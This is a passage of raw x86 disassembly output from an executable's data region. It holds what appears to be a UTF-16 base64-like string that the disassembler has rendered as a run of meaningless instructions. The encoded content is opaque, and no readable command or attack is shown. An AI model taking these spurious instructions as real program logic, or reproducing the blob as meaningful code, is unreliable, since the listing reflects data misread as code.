  40a935:	6a 00                	push   $0x0
  40a937:	5a                   	pop    %edx
  40a938:	00 4a 00             	add    %cl,0x0(%edx)
  40a93b:	74 00                	je     0x40a93d
  40a93d:	71 00                	jno    0x40a93f
  40a93f:	52                   	push   %edx
  40a940:	00 6f 00             	add    %ch,0x0(%edi)
  40a943:	6e                   	outsb  %ds:(%esi),(%dx)
  40a944:	00 50 00             	add    %dl,0x0(%eax)
  40a947:	34 00                	xor    $0x0,%al
  40a949:	59                   	pop    %ecx
  40a94a:	00 2f                	add    %ch,(%edi)
  40a94c:	00 47 00             	add    %al,0x0(%edi)
  40a94f:	38 00                	cmp    %al,(%eax)
  40a951:	71 00                	jno    0x40a953
  40a953:	6a 00                	push   $0x0
  40a955:	72 00                	jb     0x40a957
  40a957:	31 00                	xor    %eax,(%eax)
  40a959:	38 00                	cmp    %al,(%eax)
  40a95b:	59                   	pop    %ecx
  40a95c:	00 58 00             	add    %bl,0x0(%eax)
  40a95f:	6a 00                	push   $0x0
  40a961:	71 00                	jno    0x40a963
  40a963:	52                   	push   %edx
  40a964:	00 79 00             	add    %bh,0x0(%ecx)
  40a967:	4b                   	dec    %ebx
  40a968:	00 36                	add    %dh,(%esi)
  40a96a:	00 71 00             	add    %dh,0x0(%ecx)
  40a96d:	4c                   	dec    %esp
  40a96e:	00 6f 00             	add    %ch,0x0(%edi)
  40a971:	77 00                	ja     0x40a973
  40a973:	46                   	inc    %esi
  40a974:	00 4f 00             	add    %cl,0x0(%edi)
  40a977:	53                   	push   %ebx
  40a978:	00 51 00             	add    %dl,0x0(%ecx)
  40a97b:	57                   	push   %edi
  40a97c:	00 56 00             	add    %dl,0x0(%esi)
  40a97f:	4c                   	dec    %esp
  40a980:	00 47 00             	add    %al,0x0(%edi)
  40a983:	47                   	inc    %edi
  40a984:	00 5a 00             	add    %bl,0x0(%edx)
  40a987:	63 00                	arpl   %eax,(%eax)
  40a989:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a98d:	50                   	push   %eax
  40a98e:	00 6b 00             	add    %ch,0x0(%ebx)
  40a991:	70 00                	jo     0x40a993
  40a993:	77 00                	ja     0x40a995
  40a995:	70 00                	jo     0x40a997
  40a997:	32 00                	xor    (%eax),%al
  40a999:	44                   	inc    %esp
  40a99a:	00 69 00             	add    %ch,0x0(%ecx)
  40a99d:	41                   	inc    %ecx
  40a99e:	00 61 00             	add    %ah,0x0(%ecx)
  40a9a1:	6a 00                	push   $0x0
  40a9a3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9a4:	00 52 00             	add    %dl,0x0(%edx)
  40a9a7:	32 00                	xor    (%eax),%al
  40a9a9:	47                   	inc    %edi
  40a9aa:	00 58 00             	add    %bl,0x0(%eax)
  40a9ad:	2f                   	das
  40a9ae:	00 75 00             	add    %dh,0x0(%ebp)
  40a9b1:	52                   	push   %edx
  40a9b2:	00 67 00             	add    %ah,0x0(%edi)
  40a9b5:	70 00                	jo     0x40a9b7
  40a9b7:	47                   	inc    %edi
  40a9b8:	00 43 00             	add    %al,0x0(%ebx)
  40a9bb:	71 00                	jno    0x40a9bd
  40a9bd:	49                   	dec    %ecx
  40a9be:	00 70 00             	add    %dh,0x0(%eax)
  40a9c1:	55                   	push   %ebp
  40a9c2:	00 67 00             	add    %ah,0x0(%edi)
  40a9c5:	39 00                	cmp    %eax,(%eax)
  40a9c7:	61                   	popa
  40a9c8:	00 35 00 45 00 6a    	add    %dh,0x6a004500
  40a9ce:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40a9d2:	00 67 00             	add    %ah,0x0(%edi)
  40a9d5:	4f                   	dec    %edi
  40a9d6:	00 70 00             	add    %dh,0x0(%eax)
  40a9d9:	5a                   	pop    %edx
  40a9da:	00 6a 00             	add    %ch,0x0(%edx)
  40a9dd:	72 00                	jb     0x40a9df
  40a9df:	59                   	pop    %ecx
  40a9e0:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40a9e4:	00 39                	add    %bh,(%ecx)
  40a9e6:	00 4a 00             	add    %cl,0x0(%edx)
  40a9e9:	51                   	push   %ecx
  40a9ea:	00 57 00             	add    %dl,0x0(%edi)
  40a9ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9ee:	00 2b                	add    %ch,(%ebx)
  40a9f0:	00 79 00             	add    %bh,0x0(%ecx)
  40a9f3:	46                   	inc    %esi
  40a9f4:	00 42 00             	add    %al,0x0(%edx)
  40a9f7:	33 00                	xor    (%eax),%eax
  40a9f9:	76 00                	jbe    0x40a9fb
  40a9fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9fc:	00 38                	add    %bh,(%eax)
  40a9fe:	00 76 00             	add    %dh,0x0(%esi)
  40aa01:	46                   	inc    %esi
  40aa02:	00 38                	add    %bh,(%eax)
  40aa04:	00 63 00             	add    %ah,0x0(%ebx)
  40aa07:	74 00                	je     0x40aa09
  40aa09:	79 00                	jns    0x40aa0b
  40aa0b:	53                   	push   %ebx
  40aa0c:	00 49 00             	add    %cl,0x0(%ecx)
  40aa0f:	4c                   	dec    %esp
  40aa10:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40aa14:	00 56 00             	add    %dl,0x0(%esi)
  40aa17:	52                   	push   %edx
  40aa18:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa1b:	79 00                	jns    0x40aa1d
  40aa1d:	69 00 46 00 2b 00    	imul   $0x2b0046,(%eax),%eax
  40aa23:	37                   	aaa
  40aa24:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa27:	6b 00 31             	imul   $0x31,(%eax),%eax
  40aa2a:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40aa2e:	00 33                	add    %dh,(%ebx)
  40aa30:	00 46 00             	add    %al,0x0(%esi)
  40aa33:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa34:	00 47 00             	add    %al,0x0(%edi)
  40aa37:	67 00 31             	add    %dh,(%bx,%di)
  40aa3a:	00 38                	add    %bh,(%eax)
  40aa3c:	00 57 00             	add    %dl,0x0(%edi)
  40aa3f:	71 00                	jno    0x40aa41
  40aa41:	33 00                	xor    (%eax),%eax
  40aa43:	71 00                	jno    0x40aa45
  40aa45:	33 00                	xor    (%eax),%eax
  40aa47:	73 00                	jae    0x40aa49
  40aa49:	70 00                	jo     0x40aa4b
  40aa4b:	33 00                	xor    (%eax),%eax
  40aa4d:	57                   	push   %edi
  40aa4e:	00 49 00             	add    %cl,0x0(%ecx)
  40aa51:	6c                   	insb   (%dx),%es:(%edi)
  40aa52:	00 39                	add    %bh,(%ecx)
  40aa54:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40aa58:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa5b:	54                   	push   %esp
  40aa5c:	00 4f 00             	add    %cl,0x0(%edi)
  40aa5f:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40aa63:	74 00                	je     0x40aa65
  40aa65:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa66:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40aa6a:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa6d:	43                   	inc    %ebx
  40aa6e:	00 52 00             	add    %dl,0x0(%edx)
  40aa71:	65 00 44 00 76       	add    %al,%gs:0x76(%eax,%eax,1)
  40aa76:	00 32                	add    %dh,(%edx)
  40aa78:	00 36                	add    %dh,(%esi)
  40aa7a:	00 63 00             	add    %ah,0x0(%ebx)
  40aa7d:	45                   	inc    %ebp
  40aa7e:	00 5a 00             	add    %bl,0x0(%edx)
  40aa81:	2f                   	das
  40aa82:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40aa86:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa89:	64 00 44 00 4d       	add    %al,%fs:0x4d(%eax,%eax,1)
  40aa8e:	00 68 00             	add    %ch,0x0(%eax)
  40aa91:	63 00                	arpl   %eax,(%eax)
  40aa93:	39 00                	cmp    %eax,(%eax)
  40aa95:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40aa99:	74 00                	je     0x40aa9b
  40aa9b:	4f                   	dec    %edi
  40aa9c:	00 6e 00             	add    %ch,0x0(%esi)
  40aa9f:	6c                   	insb   (%dx),%es:(%edi)
  40aaa0:	00 6d 00             	add    %ch,0x0(%ebp)
  40aaa3:	5a                   	pop    %edx
  40aaa4:	00 4d 00             	add    %cl,0x0(%ebp)
  40aaa7:	58                   	pop    %eax
  40aaa8:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40aaac:	00 57 00             	add    %dl,0x0(%edi)
  40aaaf:	57                   	push   %edi
  40aab0:	00 42 00             	add    %al,0x0(%edx)
  40aab3:	6e                   	outsb  %ds:(%esi),(%dx)
  40aab4:	00 63 00             	add    %ah,0x0(%ebx)
  40aab7:	6e                   	outsb  %ds:(%esi),(%dx)
  40aab8:	00 59 00             	add    %bl,0x0(%ecx)
  40aabb:	57                   	push   %edi
  40aabc:	00 45 00             	add    %al,0x0(%ebp)
  40aabf:	57                   	push   %edi
  40aac0:	00 30                	add    %dh,(%eax)
  40aac2:	00 65 00             	add    %ah,0x0(%ebp)
  40aac5:	33 00                	xor    (%eax),%eax
  40aac7:	51                   	push   %ecx
  40aac8:	00 67 00             	add    %ah,0x0(%edi)
  40aacb:	2b 00                	sub    (%eax),%eax
  40aacd:	52                   	push   %edx
  40aace:	00 4d 00             	add    %cl,0x0(%ebp)
  40aad1:	66 00 68 00          	data16 add %ch,0x0(%eax)
  40aad5:	50                   	push   %eax
  40aad6:	00 33                	add    %dh,(%ebx)
  40aad8:	00 61 00             	add    %ah,0x0(%ecx)
  40aadb:	70 00                	jo     0x40aadd
  40aadd:	54                   	push   %esp
  40aade:	00 56 00             	add    %dl,0x0(%esi)
  40aae1:	73 00                	jae    0x40aae3
  40aae3:	46                   	inc    %esi
  40aae4:	00 6b 00             	add    %ch,0x0(%ebx)
  40aae7:	38 00                	cmp    %al,(%eax)
  40aae9:	4f                   	dec    %edi
  40aaea:	00 2b                	add    %ch,(%ebx)
  40aaec:	00 33                	add    %dh,(%ebx)
  40aaee:	00 51 00             	add    %dl,0x0(%ecx)
  40aaf1:	72 00                	jb     0x40aaf3
  40aaf3:	46                   	inc    %esi
  40aaf4:	00 35 00 64 00 65    	add    %dh,0x65006400
  40aafa:	00 4e 00             	add    %cl,0x0(%esi)
  40aafd:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40ab01:	51                   	push   %ecx
  40ab02:	00 70 00             	add    %dh,0x0(%eax)
  40ab05:	72 00                	jb     0x40ab07
  40ab07:	72 00                	jb     0x40ab09
  40ab09:	54                   	push   %esp
  40ab0a:	00 52 00             	add    %dl,0x0(%edx)
  40ab0d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab0e:	00 69 00             	add    %ch,0x0(%ecx)
  40ab11:	54                   	push   %esp
  40ab12:	00 39                	add    %bh,(%ecx)
  40ab14:	00 2f                	add    %ch,(%edi)
  40ab16:	00 63 00             	add    %ah,0x0(%ebx)
  40ab19:	57                   	push   %edi
  40ab1a:	00 6f 00             	add    %ch,0x0(%edi)
  40ab1d:	51                   	push   %ecx
  40ab1e:	00 67 00             	add    %ah,0x0(%edi)
  40ab21:	4d                   	dec    %ebp
  40ab22:	00 57 00             	add    %dl,0x0(%edi)
  40ab25:	77 00                	ja     0x40ab27
  40ab27:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40ab2a:	00 35 00 42 00 34    	add    %dh,0x34004200
  40ab30:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab33:	42                   	inc    %edx
  40ab34:	00 2b                	add    %ch,(%ebx)
  40ab36:	00 75 00             	add    %dh,0x0(%ebp)
  40ab39:	57                   	push   %edi
  40ab3a:	00 68 00             	add    %ch,0x0(%eax)
  40ab3d:	37                   	aaa
  40ab3e:	00 55 00             	add    %dl,0x0(%ebp)
  40ab41:	77 00                	ja     0x40ab43
  40ab43:	72 00                	jb     0x40ab45
  40ab45:	4b                   	dec    %ebx
  40ab46:	00 71 00             	add    %dh,0x0(%ecx)
  40ab49:	71 00                	jno    0x40ab4b
  40ab4b:	47                   	inc    %edi
  40ab4c:	00 37                	add    %dh,(%edi)
  40ab4e:	00 31                	add    %dh,(%ecx)
  40ab50:	00 61 00             	add    %ah,0x0(%ecx)
  40ab53:	71 00                	jno    0x40ab55
  40ab55:	66 00 39             	data16 add %bh,(%ecx)
  40ab58:	00 69 00             	add    %ch,0x0(%ecx)
  40ab5b:	5a                   	pop    %edx
  40ab5c:	00 2f                	add    %ch,(%edi)
  40ab5e:	00 75 00             	add    %dh,0x0(%ebp)
  40ab61:	6a 00                	push   $0x0
  40ab63:	71 00                	jno    0x40ab65
  40ab65:	63 00                	arpl   %eax,(%eax)
  40ab67:	75 00                	jne    0x40ab69
  40ab69:	6c                   	insb   (%dx),%es:(%edi)
  40ab6a:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab6d:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40ab71:	72 00                	jb     0x40ab73
  40ab73:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab74:	00 36                	add    %dh,(%esi)
  40ab76:	00 6a 00             	add    %ch,0x0(%edx)
  40ab79:	79 00                	jns    0x40ab7b
  40ab7b:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40ab7f:	42                   	inc    %edx
  40ab80:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab83:	69 00 6d 00 55 00    	imul   $0x55006d,(%eax),%eax
  40ab89:	49                   	dec    %ecx
  40ab8a:	00 57 00             	add    %dl,0x0(%edi)
  40ab8d:	7a 00                	jp     0x40ab8f
  40ab8f:	4a                   	dec    %edx
  40ab90:	00 47 00             	add    %al,0x0(%edi)
  40ab93:	54                   	push   %esp
  40ab94:	00 47 00             	add    %al,0x0(%edi)
  40ab97:	6c                   	insb   (%dx),%es:(%edi)
  40ab98:	00 2b                	add    %ch,(%ebx)
  40ab9a:	00 53 00             	add    %dl,0x0(%ebx)
  40ab9d:	42                   	inc    %edx
  40ab9e:	00 7a 00             	add    %bh,0x0(%edx)
  40aba1:	6e                   	outsb  %ds:(%esi),(%dx)
  40aba2:	00 7a 00             	add    %bh,0x0(%edx)
  40aba5:	52                   	push   %edx
  40aba6:	00 36                	add    %dh,(%esi)
  40aba8:	00 6f 00             	add    %ch,0x0(%edi)
  40abab:	41                   	inc    %ecx
  40abac:	00 4e 00             	add    %cl,0x0(%esi)
  40abaf:	69 00 42 00 6b 00    	imul   $0x6b0042,(%eax),%eax
  40abb5:	50                   	push   %eax
  40abb6:	00 35 00 6b 00 6c    	add    %dh,0x6c006b00
  40abbc:	00 4f 00             	add    %cl,0x0(%edi)
  40abbf:	35 00 54 00 53       	xor    $0x53005400,%eax
  40abc4:	00 4d 00             	add    %cl,0x0(%ebp)
  40abc7:	32 00                	xor    (%eax),%al
  40abc9:	56                   	push   %esi
  40abca:	00 52 00             	add    %dl,0x0(%edx)
  40abcd:	48                   	dec    %eax
  40abce:	00 4a 00             	add    %cl,0x0(%edx)
  40abd1:	34 00                	xor    $0x0,%al
  40abd3:	68 00 61 00 59       	push   $0x59006100
  40abd8:	00 6a 00             	add    %ch,0x0(%edx)
  40abdb:	35 00 56 00 6a       	xor    $0x6a005600,%eax
  40abe0:	00 51 00             	add    %dl,0x0(%ecx)
  40abe3:	52                   	push   %edx
  40abe4:	00 68 00             	add    %ch,0x0(%eax)
  40abe7:	43                   	inc    %ebx
  40abe8:	00 4e 00             	add    %cl,0x0(%esi)
  40abeb:	46                   	inc    %esi
  40abec:	00 61 00             	add    %ah,0x0(%ecx)
  40abef:	48                   	dec    %eax
  40abf0:	00 79 00             	add    %bh,0x0(%ecx)
  40abf3:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40abf7:	70 00                	jo     0x40abf9
  40abf9:	77 00                	ja     0x40abfb
  40abfb:	45                   	inc    %ebp
  40abfc:	00 46 00             	add    %al,0x0(%esi)
  40abff:	4c                   	dec    %esp
  40ac00:	00 58 00             	add    %bl,0x0(%eax)
  40ac03:	4f                   	dec    %edi
  40ac04:	00 2b                	add    %ch,(%ebx)
  40ac06:	00 33                	add    %dh,(%ebx)
  40ac08:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40ac0c:	00 65 00             	add    %ah,0x0(%ebp)
  40ac0f:	75 00                	jne    0x40ac11
  40ac11:	6d                   	insl   (%dx),%es:(%edi)
  40ac12:	00 7a 00             	add    %bh,0x0(%edx)
  40ac15:	2f                   	das
  40ac16:	00 46 00             	add    %al,0x0(%esi)
  40ac19:	69 00 70 00 34 00    	imul   $0x340070,(%eax),%eax
  40ac1f:	34 00                	xor    $0x0,%al
  40ac21:	79 00                	jns    0x40ac23
  40ac23:	57                   	push   %edi
  40ac24:	00 6f 00             	add    %ch,0x0(%edi)
  40ac27:	61                   	popa
  40ac28:	00 79 00             	add    %bh,0x0(%ecx)
  40ac2b:	58                   	pop    %eax
  40ac2c:	00 62 00             	add    %ah,0x0(%edx)
  40ac2f:	34 00                	xor    $0x0,%al
  40ac31:	37                   	aaa
  40ac32:	00 61 00             	add    %ah,0x0(%ecx)
  40ac35:	61                   	popa
  40ac36:	00 39                	add    %bh,(%ecx)
  40ac38:	00 4a 00             	add    %cl,0x0(%edx)
  40ac3b:	74 00                	je     0x40ac3d
  40ac3d:	6a 00                	push   $0x0
  40ac3f:	4d                   	dec    %ebp
  40ac40:	00 46 00             	add    %al,0x0(%esi)
  40ac43:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40ac47:	31 00                	xor    %eax,(%eax)
  40ac49:	75 00                	jne    0x40ac4b
  40ac4b:	47                   	inc    %edi
  40ac4c:	00 33                	add    %dh,(%ebx)
  40ac4e:	00 35 00 74 00 37    	add    %dh,0x37007400
  40ac54:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40ac58:	00 2f                	add    %ch,(%edi)
  40ac5a:	00 79 00             	add    %bh,0x0(%ecx)
  40ac5d:	32 00                	xor    (%eax),%al
  40ac5f:	51                   	push   %ecx
  40ac60:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac63:	39 00                	cmp    %eax,(%eax)
  40ac65:	33 00                	xor    (%eax),%eax
  40ac67:	5a                   	pop    %edx
  40ac68:	00 62 00             	add    %ah,0x0(%edx)
  40ac6b:	53                   	push   %ebx
  40ac6c:	00 50 00             	add    %dl,0x0(%eax)
  40ac6f:	4e                   	dec    %esi
  40ac70:	00 51 00             	add    %dl,0x0(%ecx)
  40ac73:	67 00 54 00          	add    %dl,0x0(%si)
  40ac77:	47                   	inc    %edi
  40ac78:	00 70 00             	add    %dh,0x0(%eax)
  40ac7b:	53                   	push   %ebx
  40ac7c:	00 67 00             	add    %ah,0x0(%edi)
  40ac7f:	33 00                	xor    (%eax),%eax
  40ac81:	45                   	inc    %ebp
  40ac82:	00 4a 00             	add    %cl,0x0(%edx)
  40ac85:	41                   	inc    %ecx
  40ac86:	00 49 00             	add    %cl,0x0(%ecx)
  40ac89:	77 00                	ja     0x40ac8b
  40ac8b:	46                   	inc    %esi
  40ac8c:	00 31                	add    %dh,(%ecx)
  40ac8e:	00 30                	add    %dh,(%eax)
  40ac90:	00 2b                	add    %ch,(%ebx)
  40ac92:	00 43 00             	add    %al,0x0(%ebx)
  40ac95:	37                   	aaa
  40ac96:	00 51 00             	add    %dl,0x0(%ecx)
  40ac99:	4b                   	dec    %ebx
  40ac9a:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac9d:	30 00                	xor    %al,(%eax)
  40ac9f:	58                   	pop    %eax
  40aca0:	00 32                	add    %dh,(%edx)
  40aca2:	00 65 00             	add    %ah,0x0(%ebp)
  40aca5:	7a 00                	jp     0x40aca7
  40aca7:	58                   	pop    %eax
  40aca8:	00 71 00             	add    %dh,0x0(%ecx)
  40acab:	74 00                	je     0x40acad
  40acad:	57                   	push   %edi
  40acae:	00 6f 00             	add    %ch,0x0(%edi)
  40acb1:	6f                   	outsl  %ds:(%esi),(%dx)
  40acb2:	00 4d 00             	add    %cl,0x0(%ebp)
  40acb5:	70 00                	jo     0x40acb7
  40acb7:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40acbb:	72 00                	jb     0x40acbd
  40acbd:	59                   	pop    %ecx
  40acbe:	00 2b                	add    %ch,(%ebx)
  40acc0:	00 68 00             	add    %ch,0x0(%eax)
  40acc3:	42                   	inc    %edx
  40acc4:	00 59 00             	add    %bl,0x0(%ecx)
  40acc7:	37                   	aaa
  40acc8:	00 58 00             	add    %bl,0x0(%eax)
  40accb:	78 00                	js     0x40accd
  40accd:	4a                   	dec    %edx
  40acce:	00 34 00             	add    %dh,(%eax,%eax,1)
  40acd1:	42                   	inc    %edx
  40acd2:	00 70 00             	add    %dh,0x0(%eax)
  40acd5:	39 00                	cmp    %eax,(%eax)
  40acd7:	54                   	push   %esp
  40acd8:	00 4a 00             	add    %cl,0x0(%edx)
  40acdb:	74 00                	je     0x40acdd
  40acdd:	52                   	push   %edx
  40acde:	00 52 00             	add    %dl,0x0(%edx)
  40ace1:	2b 00                	sub    (%eax),%eax
  40ace3:	63 00                	arpl   %eax,(%eax)
  40ace5:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40ace9:	75 00                	jne    0x40aceb
  40aceb:	5a                   	pop    %edx
  40acec:	00 59 00             	add    %bl,0x0(%ecx)
  40acef:	41                   	inc    %ecx
  40acf0:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40acf4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40acf7:	50                   	push   %eax
  40acf8:	00 4c 00 74          	add    %cl,0x74(%eax,%eax,1)
  40acfc:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40ad00:	00 31                	add    %dh,(%ecx)
  40ad02:	00 4f 00             	add    %cl,0x0(%edi)
  40ad05:	74 00                	je     0x40ad07
  40ad07:	72 00                	jb     0x40ad09
  40ad09:	64 00 64 00 33       	add    %ah,%fs:0x33(%eax,%eax,1)
  40ad0e:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40ad12:	00 50 00             	add    %dl,0x0(%eax)
  40ad15:	51                   	push   %ecx
  40ad16:	00 45 00             	add    %al,0x0(%ebp)
  40ad19:	50                   	push   %eax
  40ad1a:	00 53 00             	add    %dl,0x0(%ebx)
  40ad1d:	5a                   	pop    %edx
  40ad1e:	00 57 00             	add    %dl,0x0(%edi)
  40ad21:	38 00                	cmp    %al,(%eax)
  40ad23:	36 00 35 00 49 00 2b 	add    %dh,%ss:0x2b004900
  40ad2a:	00 31                	add    %dh,(%ecx)
  40ad2c:	00 35 00 45 00 32    	add    %dh,0x32004500
  40ad32:	00 4f 00             	add    %cl,0x0(%edi)
  40ad35:	34 00                	xor    $0x0,%al
  40ad37:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40ad3b:	61                   	popa
  40ad3c:	00 53 00             	add    %dl,0x0(%ebx)
  40ad3f:	35 00 57 00 6e       	xor    $0x6e005700,%eax
  40ad44:	00 36                	add    %dh,(%esi)
  40ad46:	00 49 00             	add    %cl,0x0(%ecx)
  40ad49:	37                   	aaa
  40ad4a:	00 67 00             	add    %ah,0x0(%edi)
  40ad4d:	4e                   	dec    %esi
  40ad4e:	00 76 00             	add    %dh,0x0(%esi)
  40ad51:	77 00                	ja     0x40ad53
  40ad53:	32 00                	xor    (%eax),%al
  40ad55:	46                   	inc    %esi
  40ad56:	00 4f 00             	add    %cl,0x0(%edi)
  40ad59:	62 00                	bound  %eax,(%eax)
  40ad5b:	63 00                	arpl   %eax,(%eax)
  40ad5d:	52                   	push   %edx
  40ad5e:	00 68 00             	add    %ch,0x0(%eax)
  40ad61:	4c                   	dec    %esp
  40ad62:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40ad66:	00 66 00             	add    %ah,0x0(%esi)
  40ad69:	48                   	dec    %eax
  40ad6a:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40ad6e:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  40ad72:	00 48 00             	add    %cl,0x0(%eax)
  40ad75:	63 00                	arpl   %eax,(%eax)
  40ad77:	61                   	popa
  40ad78:	00 37                	add    %dh,(%edi)
  40ad7a:	00 50 00             	add    %dl,0x0(%eax)
  40ad7d:	75 00                	jne    0x40ad7f
  40ad7f:	2f                   	das
  40ad80:	00 31                	add    %dh,(%ecx)
  40ad82:	00 48 00             	add    %cl,0x0(%eax)
  40ad85:	33 00                	xor    (%eax),%eax
  40ad87:	73 00                	jae    0x40ad89
  40ad89:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad8a:	00 72 00             	add    %dh,0x0(%edx)
  40ad8d:	2f                   	das
  40ad8e:	00 57 00             	add    %dl,0x0(%edi)
  40ad91:	49                   	dec    %ecx
  40ad92:	00 71 00             	add    %dh,0x0(%ecx)
  40ad95:	45                   	inc    %ebp
  40ad96:	00 2f                	add    %ch,(%edi)
  40ad98:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40ad9c:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40ada0:	00 48 00             	add    %cl,0x0(%eax)
  40ada3:	2f                   	das
  40ada4:	00 79 00             	add    %bh,0x0(%ecx)
  40ada7:	38 00                	cmp    %al,(%eax)
  40ada9:	4d                   	dec    %ebp
  40adaa:	00 61 00             	add    %ah,0x0(%ecx)
  40adad:	78 00                	js     0x40adaf
  40adaf:	49                   	dec    %ecx
  40adb0:	00 53 00             	add    %dl,0x0(%ebx)
  40adb3:	43                   	inc    %ebx
  40adb4:	00 45 00             	add    %al,0x0(%ebp)
  40adb7:	78 00                	js     0x40adb9
  40adb9:	45                   	inc    %ebp
  40adba:	00 4b 00             	add    %cl,0x0(%ebx)
  40adbd:	6a 00                	push   $0x0
  40adbf:	68 00 61 00 6f       	push   $0x6f006100
  40adc4:	00 70 00             	add    %dh,0x0(%eax)
  40adc7:	62 00                	bound  %eax,(%eax)
  40adc9:	75 00                	jne    0x40adcb
  40adcb:	31 00                	xor    %eax,(%eax)
  40adcd:	6e                   	outsb  %ds:(%esi),(%dx)
  40adce:	00 37                	add    %dh,(%edi)
  40add0:	00 7a 00             	add    %bh,0x0(%edx)
  40add3:	5a                   	pop    %edx
  40add4:	00 53 00             	add    %dl,0x0(%ebx)
  40add7:	54                   	push   %esp
  40add8:	00 72 00             	add    %dh,0x0(%edx)
  40addb:	62 00                	bound  %eax,(%eax)
  40addd:	42                   	inc    %edx
  40adde:	00 63 00             	add    %ah,0x0(%ebx)
  40ade1:	49                   	dec    %ecx
  40ade2:	00 35 00 77 00 6c    	add    %dh,0x6c007700
  40ade8:	00 49 00             	add    %cl,0x0(%ecx)
  40adeb:	58                   	pop    %eax
  40adec:	00 36                	add    %dh,(%esi)
  40adee:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40adf2:	00 73 00             	add    %dh,0x0(%ebx)
  40adf5:	2f                   	das
  40adf6:	00 6d 00             	add    %ch,0x0(%ebp)
  40adf9:	4e                   	dec    %esi
  40adfa:	00 79 00             	add    %bh,0x0(%ecx)
  40adfd:	4b                   	dec    %ebx
  40adfe:	00 59 00             	add    %bl,0x0(%ecx)
  40ae01:	56                   	push   %esi
  40ae02:	00 76 00             	add    %dh,0x0(%esi)
  40ae05:	4d                   	dec    %ebp
  40ae06:	00 79 00             	add    %bh,0x0(%ecx)
  40ae09:	32 00                	xor    (%eax),%al
  40ae0b:	46                   	inc    %esi
  40ae0c:	00 67 00             	add    %ah,0x0(%edi)
  40ae0f:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40ae13:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ae17:	62 00                	bound  %eax,(%eax)
  40ae19:	61                   	popa
  40ae1a:	00 78 00             	add    %bh,0x0(%eax)
  40ae1d:	41                   	inc    %ecx
  40ae1e:	00 47 00             	add    %al,0x0(%edi)
  40ae21:	69 00 43 00 41 00    	imul   $0x410043,(%eax),%eax
  40ae27:	52                   	push   %edx
  40ae28:	00 37                	add    %dh,(%edi)
  40ae2a:	00 48 00             	add    %cl,0x0(%eax)
  40ae2d:	58                   	pop    %eax
  40ae2e:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae31:	79 00                	jns    0x40ae33
  40ae33:	37                   	aaa
  40ae34:	00 45 00             	add    %al,0x0(%ebp)
  40ae37:	70 00                	jo     0x40ae39
  40ae39:	55                   	push   %ebp
  40ae3a:	00 2b                	add    %ch,(%ebx)
  40ae3c:	00 77 00             	add    %dh,0x0(%edi)
  40ae3f:	5a                   	pop    %edx
  40ae40:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40ae44:	00 48 00             	add    %cl,0x0(%eax)
  40ae47:	33 00                	xor    (%eax),%eax
  40ae49:	38 00                	cmp    %al,(%eax)
  40ae4b:	43                   	inc    %ebx
  40ae4c:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae4f:	49                   	dec    %ecx
  40ae50:	00 41 00             	add    %al,0x0(%ecx)
  40ae53:	53                   	push   %ebx
  40ae54:	00 73 00             	add    %dh,0x0(%ebx)
  40ae57:	62 00                	bound  %eax,(%eax)
  40ae59:	4e                   	dec    %esi
  40ae5a:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40ae5e:	00 51 00             	add    %dl,0x0(%ecx)
  40ae61:	74 00                	je     0x40ae63
  40ae63:	59                   	pop    %ecx
  40ae64:	00 71 00             	add    %dh,0x0(%ecx)
  40ae67:	35 00 79 00 2b       	xor    $0x2b007900,%eax
  40ae6c:	00 46 00             	add    %al,0x0(%esi)
  40ae6f:	55                   	push   %ebp
